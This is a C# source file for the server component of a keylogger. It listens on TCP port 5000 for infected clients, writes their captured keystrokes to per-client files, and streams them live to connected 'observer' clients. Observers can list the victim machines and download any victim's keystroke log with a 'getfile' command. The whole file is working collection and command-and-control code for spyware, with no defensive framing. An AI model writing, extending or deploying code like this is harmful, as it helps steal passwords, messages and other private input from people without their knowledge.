using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using Common;

namespace ServerCore
{
    /// <summary>
    /// Represents a server that handles keylogger clients and observer clients.
    /// </summary>
    public class KeyloggerServer : ISubject
    {
        public readonly List<ClientHandler> _clients = new List<ClientHandler>();
        private readonly List<IObserver> _observers = new List<IObserver>();
        private readonly object _lock = new object();
        private TcpListener _listener;
        public bool _running = false;

        /// <summary>
        /// Starts the server and listens for incoming connections.
        /// </summary>
        /// <param name="cancellationToken">Token to stop the server gracefully.</param>
        /// <returns>A task representing the asynchronous server operation.</returns>
        public async Task RunAsync(CancellationToken cancellationToken = default)
        {
            Console.WriteLine("Starting server on port 5000...");
            Directory.CreateDirectory("SaveData");

            _listener = new TcpListener(IPAddress.Any, 5000);
            _listener.Start();

            _running = true;
            Console.WriteLine("Server is running. Press Ctrl+C to stop...");

            try
            {
                var acceptTask = Task.Run(() => AcceptClientsLoop(), cancellationToken);

                // Wait until cancellation requested or server stops
                while (_running && !cancellationToken.IsCancellationRequested)
                {
                    await Task.Delay(1000, cancellationToken);
                }
            }
            catch (OperationCanceledException)
            {
                // Expected on cancellation
            }
            finally
            {
                _running = false;
                _listener.Stop();
                Console.WriteLine("Server stopped");
            }
        }



        public async Task StopAsync()
        {
            _running = false;
            _listener?.Stop();

            // Oprire toți clienții
            lock (_lock)
            {
                foreach (var client in _clients.ToList())
                {
                    client.TcpClient.Close();
                }
                _clients.Clear();

                foreach (var observer in _observers.ToList())
                {
                    (observer as ObserverClient)?.Close();
                }
                _observers.Clear();
            }

            await Task.CompletedTask;
        }

        /// <summary>
        /// Continuously accepts incoming clients and handles them based on their role (client or observer).
        /// </summary>
        /// <returns>A task representing the asynchronous loop operation.</returns>
        private async Task AcceptClientsLoop()
        {
            while (_running)
            {
                try
                {
                    TcpClient tcpClient = await _listener.AcceptTcpClientAsync();
                    string role = await ReadRoleAsync(tcpClient);

                    if (role.Equals("observer", StringComparison.OrdinalIgnoreCase))
                    {
                        var observer = new ObserverClient(tcpClient);
                        lock (_lock) _observers.Add(observer);
                        Console.WriteLine($"Observer registered: {observer.Id}");
                        _ = Task.Run(() => KeepAliveObserver(observer));
                    }
                    else
                    {
                        var handler = new ClientHandler
                        {
                            TcpClient = tcpClient,
                            Id = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).ToString()
                        };

                        lock (_lock) _clients.Add(handler);
                        Console.WriteLine($"Standard client connected: {handler.Id}");
                        _ = HandleClientAsync(handler);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Failed to accept or process incoming client: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// Reads the initial role string sent by a connected client.
        /// </summary>
        /// <param name="client">The TcpClient to read from.</param>
        /// <returns>A string indicating the role (e.g., "client", "observer").</returns>
        private async Task<string> ReadRoleAsync(TcpClient client)
        {
            var buffer = new byte[10];
            var stream = client.GetStream();
            int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
            return Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim('\0', '\r', '\n', ' ');
        }

        /// <summary>
        /// Handles communication with a connected keylogger client, saving received keystrokes and notifying observers.
        /// </summary>
        /// <param name="handler">The client handler.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        private async Task HandleClientAsync(ClientHandler handler)
        {
            var stream = handler.Stream;
            var buffer = new byte[1024];
            string safeFileName = handler.Id.Replace(":", "_");
            string filePath = Path.Combine("SaveData", safeFileName + ".txt");

            StreamWriter writer = null;

            try
            {
                writer = new StreamWriter(filePath, append: true);
                while (_running && handler.TcpClient.Connected)
                {
                    int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                    if (bytesRead == 0) break;

                    string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($"[{handler.Id}] {message}");

                    await writer.WriteAsync(message);
                    await writer.FlushAsync();

                    Notify("[" + handler.Id + "]" + message);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error while handling client {handler.Id}: {ex.Message}");
            }
            finally
            {
                if (writer != null)
                    writer.Dispose();

                Console.WriteLine($"Client disconnected: {handler.Id}");
                handler.TcpClient.Close();
                lock (_lock) _clients.Remove(handler);
            }
        }

        /// <summary>
        /// Keeps an observer client connected and handles special commands like "list" or "getfile".
        /// </summary>
        /// <param name="observer">The observer client.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        private async Task KeepAliveObserver(IObserver observer)
        {
            try
            {
                var client = observer as ObserverClient;
                var stream = client.Stream;
                var buffer = new byte[1024];

                while (_running && client.TcpClient.Connected)
                {
                    if (stream.DataAvailable)
                    {
                        int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                        if (bytesRead == 0)
                            break;

                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                        Console.WriteLine("[Observer " + client.Id + "] Command: " + command);

                        if (command.Equals("list", StringComparison.OrdinalIgnoreCase))
                        {
                            string response;
                            lock (_lock)
                            {
                                var ids = _clients.Select(c => c.Id);
                                response = "[LIST]" + string.Join("\n", ids);
                            }

                            byte[] responseData = Encoding.UTF8.GetBytes(response + "\n");
                            await stream.WriteAsync(responseData, 0, responseData.Length);
                        }
                        else if (command.StartsWith("getfile", StringComparison.OrdinalIgnoreCase))
                        {
                            string clientId = command.Substring("getfile".Length).Trim();
                            string safeFileName = clientId.Replace(":", "_");
                            string filePath = Path.Combine("SaveData", safeFileName + ".txt");

                            try
                            {
                                if (File.Exists(filePath))
                                {
                                    string fileContent;
                                    using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                    using (var sr = new StreamReader(fs))
                                    {
                                        fileContent = await sr.ReadToEndAsync();
                                    }
                                    byte[] response = Encoding.UTF8.GetBytes("[FILE]" + fileContent);
                                    await stream.WriteAsync(response, 0, response.Length);
                                }
                                else
                                {
                                    string errorMsg = "[ERROR]File not found";
                                    byte[] response = Encoding.UTF8.GetBytes(errorMsg);
                                    await stream.WriteAsync(response, 0, response.Length);
                                }
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"Error reading or sending file: {ex.Message}");
                            }
                        }
                    }

                    await Task.Delay(100);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error while keeping observer {observer.Id} alive: {ex.Message}");
            }
            finally
            {
                Console.WriteLine("Observer disconnected: " + observer.Id);
                lock (_lock) _observers.Remove(observer);
                (observer as ObserverClient)?.Close();
            }
        }

        /// <summary>
        /// Attaches an observer to the notification list.
        /// </summary>
        /// <param name="observer">The observer to attach.</param>
        public void Attach(IObserver observer)
        {
            lock (_lock) _observers.Add(observer);
        }

        /// <summary>
        /// Detaches an observer from the notification list.
        /// </summary>
        /// <param name="observer">The observer to detach.</param>
        public void Detach(IObserver observer)
        {
            lock (_lock) _observers.Remove(observer);
        }

        /// <summary>
        /// Notifies all observers with a new message.
        /// </summary>
        /// <param name="message">The message to send to observers.</param>
        public void Notify(string message)
        {
            lock (_lock)
            {
                foreach (var obs in _observers.ToList())
                {
                    obs.Update(message);
                }
            }
        }
    }
}
